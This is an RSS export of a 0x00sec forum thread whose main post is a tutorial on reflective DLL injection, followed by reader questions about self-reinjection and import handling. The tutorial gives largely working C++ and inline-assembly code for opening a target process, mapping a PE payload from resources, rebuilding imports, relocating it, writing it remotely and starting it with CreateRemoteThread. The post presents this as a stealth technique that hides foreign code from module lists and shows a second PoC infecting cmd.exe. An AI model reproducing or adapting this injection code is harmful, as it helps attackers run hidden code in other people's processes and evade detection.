        <source url="https://0x00sec.org/t/reflective-dll-injection/3080.rss">Reflective DLL Injection</source>
      </item>
      <item>
        <title>Reflective DLL Injection</title>
        <dc:creator><![CDATA[HappyHacking]]></dc:creator>
        <description><![CDATA[
            <p>Hello, I’m newbie at reversing and hacking, i have questions.<br>
Why do you rebuild import table in injector’s address?<br>
I think there are two problems,</p>
<p>First, some dlls are not loaded in target process.<br>
Second,  some dlls(maybe not system dll but something like directx or other public dll) are not loaded at same imagebase in target’s address.</p>
<p>Both can be solved by your ‘InitialiseFunctions’ function, which means you have to rebuild IAT<br>
after writing dll into target process even you already did rebuilding IAT.<br>
So why do you rebuild in injector’s address?</p>
<p>By the way, I think this way is manual mapping not reflective dll injection.<br>
Reflective dll injection means dll in target process load itself in target address space.<br>
But in this article, injector load(make image form, relocation, iat stuffs) dll in its own memory and simply write on target process.</p>
<p>Another question is if additional dlls are loaded in target’s process by using loadlibrary, then this is too easy to get detected?? I mean normal file wouldn’t load that dlls.<br>
So even if i inject my dll by using reflective injection, eventually i have to load 3rd dlls with loadlibrary.</p>
<p>is there any way to improve this?</p>
          <p><a href="https://0x00sec.org/t/reflective-dll-injection/3080/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reflective-dll-injection/3080/6</link>
        <pubDate>Sat, 09 Dec 2017 21:52:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3080-6</guid>
        <source url="https://0x00sec.org/t/reflective-dll-injection/3080.rss">Reflective DLL Injection</source>
      </item>
      <item>
        <title>Reflective DLL Injection</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>There is a parameter argument in <code>CreateRemoteThread</code> that you can use to pass the injected DLL’s module base to the DLL. Using that, it can find its own memory region to reinject itself.</p>
<p>EDIT: I’ve modified my <code>TestDLL</code> file to take in the image base as a parameter and here is what it looks like in action:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/6/672bfc0a867b58c9eec32f1c61e1c790bdadaecf.JPG" width="690" height="418"></p>
          <p><a href="https://0x00sec.org/t/reflective-dll-injection/3080/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reflective-dll-injection/3080/5</link>
        <pubDate>Sat, 29 Jul 2017 09:40:52 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3080-5</guid>
        <source url="https://0x00sec.org/t/reflective-dll-injection/3080.rss">Reflective DLL Injection</source>
      </item>
      <item>
        <title>Reflective DLL Injection</title>
        <dc:creator><![CDATA[Joe_Schmoe]]></dc:creator>
        <description><![CDATA[
            <p>I worded that badly. What I meant is, after the DLL is already injected into some process and running. How can the DLL find itself in the injectee’s memory, read itself and perform reflective injection on another process? Mostly curious about the finding part.</p>
          <p><a href="https://0x00sec.org/t/reflective-dll-injection/3080/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reflective-dll-injection/3080/4</link>
        <pubDate>Sat, 29 Jul 2017 09:31:59 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3080-4</guid>
        <source url="https://0x00sec.org/t/reflective-dll-injection/3080.rss">Reflective DLL Injection</source>
      </item>
      <item>
        <title>Reflective DLL Injection</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>A DLL is a library, not a standalone executable so you cannot execute it like normal. If I’m correct, there is a potential way to do this which is basically injecting the executable’s memory itself. Of course, this would mean that the DLL code would be part of the main injector at the source level or in some form of shellcode. Once injected, you will have to locate the entry point to start remote thread execution which can just be <code>AddressOfEntryPoint</code> but that would require you to define some code which is able to recognise if it is running under another process’s context or not so that it knows which execution path to follow. Or you could define an exported function which removes the need to check the state.</p>
<p>If you like the challenge, I’ll leave this up to you. Otherwise, I will allocate some time at a later date to create a PoC. But I’m sure you can do it! <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/reflective-dll-injection/3080/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reflective-dll-injection/3080/3</link>
        <pubDate>Sat, 29 Jul 2017 08:37:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3080-3</guid>
        <source url="https://0x00sec.org/t/reflective-dll-injection/3080.rss">Reflective DLL Injection</source>
      </item>
      <item>
        <title>Reflective DLL Injection</title>
        <dc:creator><![CDATA[Joe_Schmoe]]></dc:creator>
        <description><![CDATA[
            <p>How would you go about letting the DLL  inject itself, without the need for a separate injector? Sorta like meterpreter. Can the DLL read it’s process’ memory and copy itself from there?</p>
          <p><a href="https://0x00sec.org/t/reflective-dll-injection/3080/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reflective-dll-injection/3080/2</link>
        <pubDate>Sat, 29 Jul 2017 07:59:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3080-2</guid>
        <source url="https://0x00sec.org/t/reflective-dll-injection/3080.rss">Reflective DLL Injection</source>
      </item>
      <item>
        <title>Reflective DLL Injection</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>It’s been a while since I wrote something related to my development projects, not to mention something that’s malware-related. This was a concept that I devised (even though it already exists) while I was helping <a class="mention" href="https://0x00sec.org/u/fraq">@fraq</a> come up with ideas on stealth techniques on Windows machines. I’ve now completed a bare minimum proof-of-concept, dubbed <code>Lynx</code>, and will proceed to present its inner workings at the code level and then demonstrate it. To keep this article short and on topic, I will not be going over the details which will be mentioned in the pre-requisite list.</p>
<h4>Disclaimer</h4>
<p>The content provided is based entirely off my own research so if there is any incorrect information, I would like to sincerely apologise. If there is any feedback, please inform me and I will get to it as soon as I am able.</p>
<h4>Author Assigned Level: -</h4>
<h4>Community Assigned Level:</h4>
<p><a href="https://0x00sec.org/t/reflective-dll-injection/3080/1">Click to view the poll.</a></p>
<h4>Required Skills</h4>
<p>To completely understand the content of this article, the following lists pre-requisite knowledge:</p>
<ul>
<li>C/C++</li>
<li>Windows API</li>
<li>Virtual memory</li>
<li>PE file format</li>
<li>Dynamic-link Libraries</li>
</ul>
<hr>
<h1>DLL Injection</h1>
<p>What is DLL injection? DLL injection simply refers to the (forced) <em>injection</em> of a DLL into the space of another process and then execution of its code. The usual technique of performing this can represented by the following snippet of code:</p>
<pre><code class="lang-cpp">VOID InjectDll(HANDLE hProcess, LPCSTR lpszDllPath) {
	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(hProcess, lpBaseAddress, lpszDllPath, dwDllPathLen, &amp;dwWritten);

	HMODULE hModule = GetModuleHandle("kernel32.dll");

	LPVOID lpStartAddress = GetProcAddress(hModule, "LoadLibraryA");

	CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, NULL);
}
</code></pre>
<p>The first step is to allocate an area of memory in the virtual memory space of the target process which can be done with the <code>VirtualAllocEx</code> function, specifying the handle to the process. We can then use <code>WriteProcessMemory</code> to write data to the process by using the full path to the DLL payload. To execute the code, all we are required to do is to retrieve the <code>LoadLibrary</code> function from the <code>kernel32</code> module and then call <code>CreateRemoteThread</code> to execute the <code>LoadLibrary</code> function within the target process to force load the DLL payload as a library. As a result of this loading, it will immediately execute the DLL’s <code>DllMain</code> entry point with the <code>DLL_PROCESS_ATTACH</code> reason.</p>
<p>Here is the example DLL code that I will be using for the demonstration to represent malicious code:</p>
<pre><code class="lang-cpp">#include &lt;Windows.h&gt;

BOOL APIENTRY DllMain(HINSTANCE hInstance, DWORD fdwReason, LPVOID lpReserved) {
	::MessageBox(NULL, L"Hello world!", L"Test DLL", MB_OK);

	return TRUE;
}
</code></pre>
<h3>Reflective DLL Injection</h3>
<p>What makes <em>Reflective DLL Injection</em> different? Recall the previous DLL injection code and that the source of the DLL is obtained via its full path on disk. Because of this, it is not considered a very stealthy approach and also has an external dependency which may be problematic should it ever be separated. These issues can be addressed by using <em>Reflective DLL Injection</em> which allows the sourcing of the DLL in the form of its raw data. To be able to inject the data into the target process, we must manually parse and map the binary into the virtual memory as the Windows image loader would do when calling the <code>LoadLibrary</code> function from before. So let’s find out how this can be done.</p>
<hr>
<h1>Reflective DLL Injection Process</h1>
<p>Here is a brief summary of the stages that will be undergone to map a DLL into an external process:</p>
<ol>
<li>The DLL payload must be retrieved,</li>
<li>The DLL must then be mapped into memory,</li>
<li>After mapping it to memory, its import table must be rebuilt,</li>
<li>The base relocation table must be parsed to fix addresses due to the potential difference in image base,</li>
<li>The mapped DLL is then written into the target process.</li>
</ol>
<h2>Extracting From Resources</h2>
<p>To keep the DLL together with the injector as a single entity, we can take advantage of the PE format’s resource section.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/f77d6cb6f632c8dde7bbbe317e32774842946883.JPG" width="690" height="378"></p>
<p>Extracting the DLL’s raw binary is a trivial task which can be performed by using the resource API. Before extracting, we must check if a DLL exists in the resources like so:</p>
<pre><code class="lang-cpp">BOOL CALLBACK EnumResNameProc(HMODULE hModule, LPCWSTR lpszType, LPWSTR lpszName, LONG_PTR lParam) {
	HRSRC *h = reinterpret_cast&lt;HRSRC *&gt;(lParam);
	HRSRC hRsrc = ::FindResource(hModule, lpszName, lpszType);
	if (!hRsrc) return TRUE;
	// if found, stop enumerating
	else {
		*h = hRsrc;
		return FALSE;
	}

	return TRUE;
}

bool Injector::HasPayload() {
	// get own module
	HMODULE hModule = ::GetModuleHandle(NULL);
	if (!hModule) return false;

	// enumerate resources and select "PAYLOAD" type
	HRSRC hRsrc = NULL;
	if (!::EnumResourceNames(hModule, L"PAYLOAD", EnumResNameProc, reinterpret_cast&lt;LPARAM&gt;(&amp;hRsrc)) &amp;&amp; GetLastError() != ERROR_RESOURCE_ENUM_USER_STOP)
		return false;	// fail if no PAYLOAD resources are found

	if (!hRsrc) return false;

	this-&gt;payload-&gt;hResPayload = hRsrc;

	return true;
}
</code></pre>
<p>The above code will enumerate all of the resources of type <code>PAYLOAD</code> (there should only be one) and if it is successful, it will retrieve a handle to the resource by calling <code>FindResource</code>. Once we’ve obtained the handle, we can get a pointer to the raw binary data and copy it into memory using the following:</p>
<pre><code class="lang-cpp">bool Injector::LoadFromResource() {
	// get resource size
	DWORD dwSize = ::SizeofResource(::GetModuleHandle(NULL), this-&gt;payload-&gt;hResPayload);
	// load resource
	HGLOBAL hResData = ::LoadResource(NULL, this-&gt;payload-&gt;hResPayload);
	if (hResData) {
		// get pointer to data
		LPVOID lpPayload = ::LockResource(hResData);
		if (lpPayload) {
			// save to vector
			if (MemoryMapPayload(lpPayload))
				return true;
		}
	}

	return false;
}
</code></pre>
<p>Keep in mind that after calling <code>LockResource</code>, the pointer to the DLL resource is read-only and the data is in its <em>disk form</em>, meaning that the offsets are all file offsets, not memory offsets.</p>
<h2>Mapping to Memory</h2>
<p>We will need to convert it into its <em>memory form</em> for further processing which we can do by parsing its structures and mapping it to a memory space. The following code will achieve this:</p>
<pre><code class="lang-cpp">bool Injector::MemoryMapPayload(LPVOID lpPayload) {
	// get DOS header
	PIMAGE_DOS_HEADER pidh = reinterpret_cast&lt;PIMAGE_DOS_HEADER&gt;(lpPayload);
	// get NT headers
	PIMAGE_NT_HEADERS pinh = reinterpret_cast&lt;PIMAGE_NT_HEADERS&gt;(reinterpret_cast&lt;DWORD&gt;(lpPayload) + pidh-&gt;e_lfanew);

    // get handle to mapping
	HANDLE hMapping = ::CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, pinh-&gt;OptionalHeader.SizeOfImage, NULL);
	if (hMapping) {
        // get a pointer to the mapped address
		LPVOID lpMapping = ::MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
		if (lpMapping) {
			// map payload to memory
			// copy headers
			::CopyMemory(lpMapping, lpPayload, pinh-&gt;OptionalHeader.SizeOfHeaders);
			// copy sections
			for (int i = 0; i &lt; pinh-&gt;FileHeader.NumberOfSections; i++) {
				PIMAGE_SECTION_HEADER pish = reinterpret_cast&lt;PIMAGE_SECTION_HEADER&gt;(reinterpret_cast&lt;DWORD&gt;(lpPayload) + pidh-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
				::CopyMemory(reinterpret_cast&lt;LPVOID&gt;(reinterpret_cast&lt;DWORD&gt;(lpMapping) + pish-&gt;VirtualAddress), reinterpret_cast&lt;LPVOID&gt;(reinterpret_cast&lt;DWORD&gt;(lpPayload) + pish-&gt;PointerToRawData), pish-&gt;SizeOfRawData);
			}
			this-&gt;vPayloadData = std::vector&lt;BYTE&gt;(reinterpret_cast&lt;LPBYTE&gt;(lpMapping), reinterpret_cast&lt;LPBYTE&gt;(lpMapping) + pinh-&gt;OptionalHeader.SizeOfImage);
			::UnmapViewOfFile(lpMapping);
			::CloseHandle(hMapping);
			return true;
		}
		::CloseHandle(hMapping);
	}

	return false;
}
</code></pre>
<p>Here, a segment of memory is mapped so that we can transform the binary into its memory-mapped counterpart. The sections are first copied into memory as they are the same as a disk object and a memory image. Next, the section headers are enumerated to gather the virtual offsets of the sections themselves which is used to correctly insert the sections into their correct regions. Once the transformation is complete, we can simply store it and clean up the mapped memory.</p>
<h2>Rebuilding and Injecting the DLL</h2>
<p>Before we rebuild the DLL, we must first check if the target process exists, and if it does, retrieve the handle to it. We can do this by enumerating all of the running processes and then comparing their names:</p>
<pre><code class="lang-cpp">bool Injector::GetProcess() {
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &amp;pe32)) {
		while (Process32Next(hSnapshot, &amp;pe32)) {
            // check process name
			if (wcsicmp(pe32.szExeFile, this-&gt;szProcessName.c_str()) == 0) {
				// get handle to process
				HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
				::CloseHandle(hSnapshot);
                // save handle
				this-&gt;payload-&gt;hProcess = hProcess;
				return true;
			}
		}
	} else
		return ::CloseHandle(hSnapshot), false;

	return false;
}
</code></pre>
<p>We are now able to check if we can allocate some memory in the target process’s address space. To achieve this, we can use the <code>VirtualAllocEx</code> function, specifying the handle to the process and the size of the image:</p>
<pre><code class="lang-cpp">	// allocate space in target process
	this-&gt;payload-&gt;lpAddress = ::VirtualAllocEx(this-&gt;payload-&gt;hProcess, NULL, pinh-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!this-&gt;payload-&gt;lpAddress)
		return Debug(L"Failed to allocate space: %lu\n", GetLastError()), false;
</code></pre>
<p>Once we’ve confirmed that there is available space, we can move onto rebuilding the DLL. Firstly, rebuilding the import table:</p>
<pre><code class="lang-cpp">bool Injector::RebuildImportTable(LPVOID lpBaseAddress, PIMAGE_NT_HEADERS pinh) {
	// parse import table if size != 0
	if (pinh-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
		// https://stackoverflow.com/questions/34086866/loading-an-executable-into-current-processs-memory-then-executing-it
		PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = reinterpret_cast&lt;PIMAGE_IMPORT_DESCRIPTOR&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + pinh-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

		// Walk until you reached an empty IMAGE_IMPORT_DESCRIPTOR
		while (pImportDescriptor-&gt;Name != NULL) {
			// get the name of each DLL
			LPSTR lpLibrary = reinterpret_cast&lt;PCHAR&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + pImportDescriptor-&gt;Name);

			HMODULE hLibModule = ::LoadLibraryA(lpLibrary);

			PIMAGE_THUNK_DATA nameRef = reinterpret_cast&lt;PIMAGE_THUNK_DATA&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + pImportDescriptor-&gt;Characteristics);
			PIMAGE_THUNK_DATA symbolRef = reinterpret_cast&lt;PIMAGE_THUNK_DATA&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + pImportDescriptor-&gt;FirstThunk);
			PIMAGE_THUNK_DATA lpThunk = reinterpret_cast&lt;PIMAGE_THUNK_DATA&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + pImportDescriptor-&gt;FirstThunk);
			for (; nameRef-&gt;u1.AddressOfData; nameRef++, symbolRef++, lpThunk++) {
				// fix addresses
				// check if import by ordinal
				if (nameRef-&gt;u1.AddressOfData &amp; IMAGE_ORDINAL_FLAG)
					*(FARPROC *)lpThunk = ::GetProcAddress(hLibModule, MAKEINTRESOURCEA(nameRef-&gt;u1.AddressOfData));
				else {
					PIMAGE_IMPORT_BY_NAME thunkData = reinterpret_cast&lt;PIMAGE_IMPORT_BY_NAME&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + nameRef-&gt;u1.AddressOfData);
					*(FARPROC *)lpThunk = ::GetProcAddress(hLibModule, reinterpret_cast&lt;LPCSTR&gt;(&amp;thunkData-&gt;Name));
				}
			}
			::FreeLibrary(hLibModule);
			// advance to next IMAGE_IMPORT_DESCRIPTOR
			pImportDescriptor++;
		}
	}

	return true;
}
</code></pre>
<p>Basically, the import table is obtained via the Optional Header structure of the PE format and it is <em>walked</em>, retrieving the imported function names and then overwriting the <code>FirstThunk</code> addresses. This is done by first getting the library containing the function using <code>LoadLibrary</code> and then calling <code>GetProcAddress</code> to get the proper address.</p>
<p>The next step is to relocate the address using the Relocation Table. The delta of the actual allocated base address in the target process in conjunction with the original base address is calculated with a simple subtraction:</p>
<pre><code class="lang-cpp">DWORD dwDelta = reinterpret_cast&lt;DWORD&gt;(this-&gt;payload-&gt;lpAddress) - pinh-&gt;OptionalHeader.ImageBase;
</code></pre>
<p>Similar to the import table, the data in the relocation table is <em>walked</em> and applies the appropriate offset to the provided addresses using the calculated delta:</p>
<pre><code class="lang-cpp">bool Injector::BaseRelocate(LPVOID lpBaseAddress, PIMAGE_NT_HEADERS pinh, DWORD dwDelta) {
	IMAGE_BASE_RELOCATION *r = reinterpret_cast&lt;IMAGE_BASE_RELOCATION *&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + pinh-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); //The address of the first I_B_R struct 
	IMAGE_BASE_RELOCATION *r_end = reinterpret_cast&lt;IMAGE_BASE_RELOCATION *&gt;(reinterpret_cast&lt;DWORD_PTR&gt;(r) + pinh-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size - sizeof(IMAGE_BASE_RELOCATION)); //The addr of the last
	for (; r &lt; r_end; r = reinterpret_cast&lt;IMAGE_BASE_RELOCATION *&gt;(reinterpret_cast&lt;DWORD_PTR&gt;(r) + r-&gt;SizeOfBlock)) {
		WORD *reloc_item = reinterpret_cast&lt;WORD *&gt;(r + 1);
		DWORD num_items = (r-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		for (DWORD i = 0; i &lt; num_items; ++i, ++reloc_item) {
			switch (*reloc_item &gt;&gt; 12) {
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					*(DWORD_PTR *)(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + r-&gt;VirtualAddress + (*reloc_item &amp; 0xFFF)) += dwDelta;
					break;
				default:
					return false;
			}
		}
	}

	return true;
}
</code></pre>
<p>Now that we’ve rebuilt what needs to be rebuilt and have allocated memory in the external process, we can just simply write the entire binary in using <code>WriteProcessMemory</code>:</p>
<pre><code class="lang-cpp">if (!::WriteProcessMemory(this-&gt;payload-&gt;hProcess, this-&gt;payload-&gt;lpAddress, this-&gt;vPayloadData.data(), pinh-&gt;OptionalHeader.SizeOfImage, NULL))
		return Debug(L"Failed write payload: %lu\n", GetLastError()), false;
</code></pre>
<p>Easy, right?</p>
<h2>Executing the DLL</h2>
<p>Execution is almost the same as normal DLL injection, using a call to <code>CreateRemoteThread</code>. The only difference here is that we will not be using <code>LoadLibrary</code> but instead, we will use the address of entry point value directly of the DLL which should be the <code>DllMain</code> entry point.</p>
<pre><code class="lang-cpp">// entry point is the base address + the AddressOfEntryPoint value
this-&gt;payload-&gt;dwEntryPoint = reinterpret_cast&lt;DWORD&gt;(this-&gt;payload-&gt;lpAddress) + pinh-&gt;OptionalHeader.AddressOfEntryPoint;

HANDLE hThread = ::CreateRemoteThread(this-&gt;payload-&gt;hProcess, NULL, 0, reinterpret_cast&lt;LPTHREAD_START_ROUTINE&gt;(payload-&gt;dwEntryPoint), NULL, 0, NULL);
</code></pre>
<p>And that’s it!</p>
<hr>
<h1>Demonstration</h1>
<p>In this demonstration, I will be using <code>putty.exe</code> because I can and I can’t use <code>explorer.exe</code> because it is a 64-bit process versus my 32-bit injector and DLL. Also, I don’t have a 32-bit VM anywhere. I will also be using the <em>Process Hacker</em> monitoring tool to view any forensic evidence as a result of the DLL injection.</p>
<h2>Normal DLL Injection</h2>
<p>Here is the result of the normal DLL injection method:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a13cbf10fed4d55ae48a25d6152d4ca994b95a73.JPG" width="690" height="372"></p>
<p>We can see that it shows up clearly on the list of loaded modules and is a very obvious giveaway that there is foreign code in the affected process.</p>
<h2>Reflective DLL Injection</h2>
<p>Let’s now check out the reflective DLL injection method:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/4/4646eff4731dbab40c690c488c89e1d2d411459a.JPG" width="690" height="371"></p>
<p>And here, there is no name for that block of memory space. Besides the <code>RWX</code> permissions (which can easily be fixed but remember that this is a PoC), there are no obvious signs that there exists any foreign code! Pretty neat, huh?</p>
<hr>
<h1>Addressing Some Issues</h1>
<p>Just a little addition to the article, there are problems which may be encountered when executing in the space of another process. While this example DLL may work on many processes, it will only be guaranteed to work on those which have imported the <code>user32.dll</code> library as the (only) function it uses <code>MessageBox</code>. Many GUI applications on Windows import <code>user32.dll</code> as a requirement to be able to create part of the graphical components.</p>
<p>Instead of using the example DLL, say, we wanted to use something more complex that depends on multiple libraries which may or may not be imported by the target process, for example, a console application. In such an event, execution of the non-existent function (within the space of the target process) will cause some access violation error with a very likely chance as it could be attempting to execute non-executable memory. The process will inevitably crash. So how could we solve this issue?</p>
<h2>Dynamically Retrieving Functions</h2>
<p>One of the solutions is to obtain the API before executing the main payload which can be done by using the classic <code>LoadLibrary</code> and <code>GetProcAddress</code> combination to load libraries into the process space and then getting the addresses of a desired functions. I will quickly explain it because I’ve already detailed it in another <a href="https://0x00sec.org/t/understanding-a-win32-virus-background-material/1043">thread</a>. Essentially, we find the image base of the <code>kernel32.dll</code> module which is always loaded in every process due to some crucial functions required to initialise the program. Once a handle has been gained, the export table is found and then walked where each name of every exported function is compared which when a needed function is found, so can the address of the function, i.e. <code>LoadLibrary</code> and <code>GetProcAddress</code>. With these two function addresses present, it is possible to then load more libraries into the process and find the addresses of any desired function that exists in the WinAPI. Let’s see how this is done.</p>
<pre><code class="lang-auto">void InitialiseFunctions(void) {
	HMODULE hKernel32Mod = NULL;
	__asm {
		pushad
		mov		eax, fs:[0x30]
		mov		eax, [eax + 0x0C]
		mov		eax, [eax + 0x14]
		mov		eax, [eax]
		mov		eax, [eax]
		mov		eax, [eax + 0x10]
		mov		hKernel32Mod, eax
		popad
	}

	// get DOS header
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)(hKernel32Mod);
	// get NT headers
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)hKernel32Mod + pidh-&gt;e_lfanew);
	// find eat
	PIMAGE_EXPORT_DIRECTORY pied = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hKernel32Mod + pinh-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// find functions
	LPDWORD dwAddresses = (LPDWORD)((DWORD)hKernel32Mod + pied-&gt;AddressOfFunctions);
	LPDWORD dwNames = (LPDWORD)((DWORD)hKernel32Mod + pied-&gt;AddressOfNames);
	LPWORD wOrdinals = (LPWORD)((DWORD)hKernel32Mod + pied-&gt;AddressOfNameOrdinals);

	// loop through all names of functions and select LoadLibrary and GetProcAddress
	for (int i = 0; i &lt; pied-&gt;NumberOfNames; i++) {
		LPCSTR lpName = (LPCSTR)((DWORD)hKernel32Mod + dwNames[i]);
		if (!strcmp(lpName, "LoadLibraryA"))
			fnLoadLibraryA = (pfnLoadLibraryA)((DWORD)hKernel32Mod + dwAddresses[wOrdinals[i]]);
		else if (!strcmp(lpName, "GetProcAddress"))
			fnGetProcAddress = (pfnGetProcAddress)((DWORD)hKernel32Mod + dwAddresses[wOrdinals[i]]);
	}

	// load libraries
	HMODULE hUser32Mod = fnLoadLibraryA("user32.dll");
	HMODULE hShlwapiMod = fnLoadLibraryA("shlwapi.dll");

	// kernel32
	// functions to reinfect another process
	fnCreateToolhelp32Snapshot = (pfnCreateToolhelp32Snapshot)fnGetProcAddress(hKernel32Mod, "CreateToolhelp32Snapshot");
	fnProcess32FirstW = (pfnProcess32FirstW)fnGetProcAddress(hKernel32Mod, "Process32FirstW");
	fnProcess32NextW = (pfnProcess32NextW)fnGetProcAddress(hKernel32Mod, "Process32NextW");
	fnOpenProcess = (pfnOpenProcess)fnGetProcAddress(hKernel32Mod, "OpenProcess");
	fnCloseHandle = (pfnCloseHandle)fnGetProcAddress(hKernel32Mod, "CloseHandle");
	fnIsWow64Process = (pfnIsWow64Process)fnGetProcAddress(hKernel32Mod, "IsWow64Process");
	fnGetProcessHeap = (pfnGetProcessHeap)fnGetProcAddress(hKernel32Mod, "GetProcessHeap");
	fnHeapAlloc = (pfnHeapAlloc)fnGetProcAddress(hKernel32Mod, "HeapAlloc");
	fnGetModuleFileNameW = (pfnGetModuleFileNameW)fnGetProcAddress(hKernel32Mod, "GetModuleFileNameW");
	fnVirtualAllocEx = (pfnVirtualAllocEx)fnGetProcAddress(hKernel32Mod, "VirtualAllocEx");
	fnWriteProcessMemory = (pfnWriteProcessMemory)fnGetProcAddress(hKernel32Mod, "WriteProcessMemory");
	fnCreateRemoteThread = (pfnCreateRemoteThread)fnGetProcAddress(hKernel32Mod, "CreateRemoteThread");
	fnHeapFree = (pfnHeapFree)fnGetProcAddress(hKernel32Mod, "HeapFree");
	fnGetLastError = (pfnGetLastError)fnGetProcAddress(hKernel32Mod, "fnGetLastError");
	fnExitProcess = (pfnExitProcess)fnGetProcAddress(hKernel32Mod, "ExitProcess");
	fnGetNativeSystemInfo = (pfnGetNativeSystemInfo)fnGetProcAddress(hKernel32Mod, "GetNativeSystemInfo");
	// functions for payload
	fnWaitForSingleObject = (pfnWaitForSingleObject)fnGetProcAddress(hKernel32Mod, "WaitForSingleObject");
	fnGetModuleHandleW = (pfnGetModuleHandleW)fnGetProcAddress(hKernel32Mod, "GetModuleHandleW");
	fnCreateProcessW = (pfnCreateProcessW)fnGetProcAddress(hKernel32Mod, "CreateProcessW");

	// shwlapi
	fnStrStrIW = (pfnStrStrIW)fnGetProcAddress(hShlwapiMod, "StrStrIW");

	// user32
	// debugging functions
#ifdef _DEBUG
	fnwvsprintfW = (pfnwvsprintfW)fnGetProcAddress(hUser32Mod, "wvsprintfW");
	fnMessageBoxW = (pfnMessageBoxW)fnGetProcAddress(hUser32Mod, "MessageBoxW");
#endif // _DEBUG

}
</code></pre>
<p>The inline assembly at the start represents the procedure to get the image base of the <code>kernel32.dll</code> library. It finds the PEB of the process, then iterates through a list of memory modules until it hits the second one. Note that this will always be in the same order as it is called the <code>InMemoryOrderModuleList</code> member, starting with <code>ntdll.dll</code> first, then <code>kernel32.dll</code>, then the main process itself. The <code>DllBase</code> member is at a <code>0x10</code> offset from the beginning of the data structure defined by the entry:</p>
<pre><code class="lang-auto">typedef struct _LDR_DATA_TABLE_ENTRY {
    // unnecessary members omitted
    LIST_ENTRY InMemoryOrderLinks;    // offset 0; size 8
    PVOID Reserved2[2];               // offset 8; size 8
    PVOID DllBase;                    // offset 16
    // unnecessary members omitted
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
</code></pre>
<p>After this, the export table address is found and pointed to by <code>pied</code> which is then used to find the pointer to the addresses which hold the names, ordinals and function addresses. We can use a loop to iterate through all the functions (they are in alphabetical order) to match and retrieve <code>LoadLibrary</code> and <code>GetProcAddress</code>. These two functions are then used to load the required libraries and their functions.</p>
<p>Now we can execute the payload.</p>
<h2>Demonstration</h2>
<p>The following demonstration shows another PoC program which I named <code>Phage</code> which is an executable that uses the reflective DLL injection style method to infect another process (hence does not rely on a DLL). Here I have chosen to infect <code>cmd.exe</code> under 32-bit Windows 7 (to prove the functioning dynamically-retrieved API) and disable a particular feature.</p>
<p>Let’s look at the process’s initial memory space and what libraries are present by default:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/5/53087b3980379ced2dec5f7100ad8e911497e523.JPG" width="690" height="360"></p>
<p>and then here it is infected:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/d/dc19e3713c8a4909620190eafc3e58f5ba0ca474.JPG" width="690" height="368"></p>
